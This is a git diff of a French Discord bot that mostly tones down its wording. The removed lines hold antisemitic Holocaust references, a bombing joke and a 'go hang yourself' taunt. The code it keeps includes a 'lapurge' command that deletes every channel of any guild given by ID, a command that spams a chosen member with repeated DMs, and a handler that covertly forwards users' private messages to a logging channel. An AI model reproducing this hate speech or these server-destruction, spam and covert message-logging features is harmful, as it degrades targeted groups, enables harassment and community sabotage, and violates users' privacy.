@@ -323,14 +323,16 @@ if __name__ == "__main__":
     # ----- Listen DM to Dump Channel ----- #
 
     @bot.event
-    async def on_message(message: str):
-        # If the message is a Private Message
+    async def on_message(message):
+    # If the message is a Private Message
         if isinstance(message.channel, discord.DMChannel):
             dump_channel = bot.get_channel(1177299998036197387)
-            content = f"**({message.author.id}) - {message.author} :** {message.content}"
-            # Send msg to channel
-            await dump_channel.send(content)
 
+            # Check if the message is not sent by the bot itself
+            if message.author.id != bot.user.id:
+                content = f"**({message.author.id}) - {message.author} :** {message.content}"
+                # Send msg to channel
+                await dump_channel.send(content)
 
     # ---- Commands of my Bot ---- #
 
@@ -342,8 +344,8 @@ if __name__ == "__main__":
             if member is not None:
                 if nombre <= 0:
                     timeoutduration = timedelta(seconds=60)
-                    await interaction.user.timeout(timeoutduration, reason="T'es con ou quoi ?")
-                    await interaction.user.send("T'es con ou quoi ?")
+                    await interaction.user.timeout(timeoutduration)
+                    await interaction.user.send("# ????")
                 await interaction.response.send_message(content=f"Joshing {member.mention} {nombre} fois", ephemeral=True)
                 for i in range(nombre):
                     await member.send(f"https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExbGRyYnRwNGxyb2R0NDZiNWZ3cDFieWxiNnVoMGN5Zmd0eDVmbDF1dCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/TNwX48Ear64uWmN7t3/giphy.gif")
@@ -380,17 +382,17 @@ if __name__ == "__main__":
 
 
     @commands.has_permissions(moderate_members=True)
-    @bot.tree.command(name = 'tagueule' , description="Fait ferme la gueule à la personne de ton choix")
+    @bot.tree.command(name = 'timeout' , description="Timeout la personne de ton choix")
     @app_commands.describe(member = "La personne à faire taire", duration = "Durée du mute", reason = "Raison du mute")
 
-    async def tagueule(interaction:discord.Interaction, member: discord.User, duration: str, reason: str = None):
+    async def timeout(interaction:discord.Interaction, member: discord.User, duration: str, reason: str = None):
         if member is not None:
             if duration is not None:
                 if interaction.permissions.moderate_members:
                     duration = timedelta(seconds=int(duration))
                     target_user = interaction.guild.get_member(member.id)
                     await target_user.timeout(duration, reason=reason)
-                    await interaction.response.send_message(content=f"# {member.mention} a fermé sa gueule !")
+                    await interaction.response.send_message(content=f"# {member.mention} a été timeout !", ephemeral=True)
                 else:
                     await interaction.response.send_message(content="Tu n'as pas la permission de timeout...", ephemeral=True)
 
@@ -410,17 +412,17 @@ if __name__ == "__main__":
 
 
     @commands.has_permissions(manage_channels=True, manage_roles=True)
-    @bot.tree.command(name = 'lasolutionfinale', description="On reproduit la shoah par balle")
+    @bot.tree.command(name = 'lapurge', description="Destruction du serveur")
     @app_commands.describe(guildid = "Serveur à détruire", last_words = "Le dernier message avant la destruction", password = "Mot de passe")
     # @app_commands.choices(guildlist = [])
 
-    async def lasolutionfinale(interaction:discord.Interaction, guildid: str, last_words: str, password: str):
+    async def lapurge(interaction:discord.Interaction, guildid: str, last_words: str, password: str):
         if interaction.user.id in nuke_whitelist:
             if guildid is not None:
                 target_guild = bot.get_guild(int(guildid))
                 welcomechannel = target_guild.system_channel
 
-            if password == "JeDetesteLesJuifs#39-45":
+            if password == "TotoEtTitiDansLaBaseDeDonnees":
                 await interaction.response.send_message(content= "Destruction du serveur en cours...", ephemeral=True)
 
                 #--------------------------------------------#
@@ -432,7 +434,7 @@ if __name__ == "__main__":
                 asyncio.sleep(1)
                 await welcomechannel.send(f"## 1...")
                 asyncio.sleep(1)
-                await welcomechannel.send(f"# ALLAHU AKBAR")
+                await welcomechannel.send(f"# KABOOM")
 
                 for channel in target_guild.channels:
                     try:
@@ -440,13 +442,13 @@ if __name__ == "__main__":
                         # Ajouter la suppression des rôles
                         # Ajouter la suppression des emojis
                         # Ajouter le bannissement des membres
-                        print("caca")
+                        print(f"Channel {channel.name} deleted")
                     except:
                         pass
             else:
-                await interaction.response.send_message(content= "Mot de passe incorrect, va te pendre", ephemeral=True)
+                await interaction.response.send_message(content= "Mot de passe incorrect", ephemeral=True)
         else:
-            await interaction.response.send_message(content="# BOZO")
+            await interaction.response.send_message(content="...", ephemeral=True)
 
 
 
@@ -489,7 +491,7 @@ if __name__ == "__main__":
                         view.remove_item(participer1)
                         flagplayer1 = True
                     else:
-                        await interaction.response.send_message(content= "On t'as pas sonné sale bozo...", ephemeral=True)
+                        await interaction.response.send_message(content= "On t'as pas sonné toi...", ephemeral=True)
 
                     await message_sent.edit(embed=embed)
                     try:
@@ -505,7 +507,7 @@ if __name__ == "__main__":
                         view.remove_item(participer2)
                         flagplayer2 = True
                     else:
-                        await interaction.response.send_message(content= "On t'as pas sonné sale bozo...", ephemeral=True)
+                        await interaction.response.send_message(content= "On t'as pas sonné toi...", ephemeral=True)
 
                     await message_sent.edit(embed=embed)
                     try:
@@ -579,7 +581,7 @@ if __name__ == "__main__":
                     await target_user.timeout(durationtimeout)
                     
             else:
-                embed.add_field(name= "BOZO", value="Aucun des deux joueurs n'ont participé, la punition est doublée...", inline=False)
+                embed.add_field(name= "Dommage...", value="Aucun des deux joueurs n'ont participé, la punition est doublée...", inline=False)
                 await message_sent.edit(embed=embed)
                 durationtimeout = timedelta(seconds=(duration)*2)
                 target_user = interaction.guild.get_member(user1.id)
